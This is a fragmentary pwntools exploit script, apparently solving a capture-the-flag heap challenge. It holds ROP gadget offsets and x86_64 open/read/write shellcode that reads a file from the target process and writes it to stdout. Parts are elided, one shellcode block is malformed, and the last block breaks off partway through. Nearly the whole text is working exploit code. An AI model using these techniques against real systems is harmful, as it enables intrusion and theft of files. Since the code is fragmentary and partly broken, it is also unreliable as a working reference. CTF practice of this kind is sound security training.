...
def start(argv=[], *a, **kw):
    if args.GDB:
        ...
        return process([elf.path] + argv, env={"LD_PRELOAD": libc.path}, *a, **kw)
...
def add(size, name):
	...
	io.sendafter("color: ", "HKHKHKH");	# 4b48
...
####gadgets
add_rsp = 0x00077f66 # add rsp, 0x38; ret
pop_rdi = 0x001273dc
pop_rsi = 0x00126117
pop_rdx = 0x000c45ed
...
shellcode = asm(
		...
		xor rdx, rdx
		mov r10, {}
		mov rdi, QWORD PTR [r10+0x4d0]
		syscall
		mov r10, rax
		xor rax, rax
		mov rdi, r10
		mov r10, {}
		mov rsi, QWORD PTR [r10+0x100]
		mov rdx, 0x50
		syscall
		mov rax, 0x1
		mov rdi, rax
		...
		mov rdi, 0x1337
		syscall
		.format(hex(heap_base), hex(heap_base)), arch='x86_64')
"""
# open  rdi: filename, rsi: flags rdx: mode
# read  rdi: fd, rsi: buf, rdx: size
# write rdi: fd, rsi: buf, rdx: size
shellcode = asm("""
		xor rax, rax
		mov r10, {}
		add r10, 0x4d0
